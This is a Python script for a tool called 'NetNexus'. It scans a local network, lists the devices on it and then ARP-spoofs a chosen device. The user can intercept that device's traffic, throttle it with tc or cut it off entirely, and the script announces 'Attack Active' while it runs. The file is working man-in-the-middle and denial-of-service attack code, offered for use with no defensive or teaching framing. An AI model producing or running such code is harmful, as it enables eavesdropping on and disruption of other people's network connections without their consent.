import scapy.all as scapy
import os
import time
import sys
import subprocess
from core import scanner, spoof

def set_forwarding(state):
    val = "1" if state else "0"
    subprocess.run(["sudo", "sysctl", "-w", f"net.ipv4.ip_forward={val}"], capture_output=True)

def set_limit(interface, speed):
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)
    try:
        subprocess.run(["sudo", "tc", "qdisc", "add", "dev", interface, "root", "tbf", 
                        "rate", speed, "latency", "50ms", "burst", "1540"], check=True)
        print(f"[*] Bandwidth limited to {speed}")
    except Exception as e:
        print(f"[-] Limit Error: {e}")

def clear_limit(interface):
    subprocess.run(["sudo", "tc", "qdisc", "del", "dev", interface, "root"], capture_output=True)

def main():
    print("[*] NetNexus Initializing...")
    # Update this name to your actual interface (ip a)
    iface = "wlan0" 
    scapy.conf.iface = iface
    
    if os.geteuid() != 0:
        print("[-] Error: You must run this with sudo!")
        return

    gateway_ip = "192.168.8.1"
    ip_range = "192.168.8.1/24"
    device_memory = {} 

    while True:
        print("\n" + "="*45)
        print("      NetNexus: Discovery & Control")
        print("="*45)
        
        # Scan and update persistent memory
        device_memory = scanner.scan(ip_range, device_memory)
        current_list = list(device_memory.values())
        
        if not current_list:
            print("[!] No devices found. Check your interface or network.")
        
        for index, dev in enumerate(current_list):
            print(f"{index}\t{dev['ip']}\t\t{dev['name']}")
        
        print("-" * 45)
        print("[R] Refresh  [C] Exit")
        
        user_input = input("\nSelect ID: ").lower().strip()
        if user_input == 'c': sys.exit()
        if user_input == 'r': continue
        
        try:
            target = current_list[int(user_input)]
            target_ip, target_mac = target['ip'], target['mac']

            print(f"\n[1] Intercept | [2] Limit | [3] Kill")
            mode = input("Select Action: ")

            print("[*] Resolving Gateway...")
            gateway_mac, _ = spoof.get_device_info(gateway_ip)

            if mode == "1":
                set_forwarding(True)
                clear_limit(iface)
            elif mode == "2":
                kbps = input("Speed (kbps): ")
                set_forwarding(True)
                set_limit(iface, f"{kbps}kbps")
            elif mode == "3":
                set_forwarding(False)
                clear_limit(iface)

            print(f"[*] Attack Active on {target_ip}. Ctrl+C to stop.")
            while True:
                spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
                time.sleep(0.5) 
                
        except (ValueError, IndexError):
            print("[-] Invalid ID selected.")
        except KeyboardInterrupt:
            print("\n[*] Stopping... Cleaning up settings.")
            set_forwarding(True)
            clear_limit(iface)
            spoof.restore(target_ip, gateway_ip)
            spoof.restore(gateway_ip, target_ip)
            time.sleep(1)

if __name__ == "__main__":
    main()
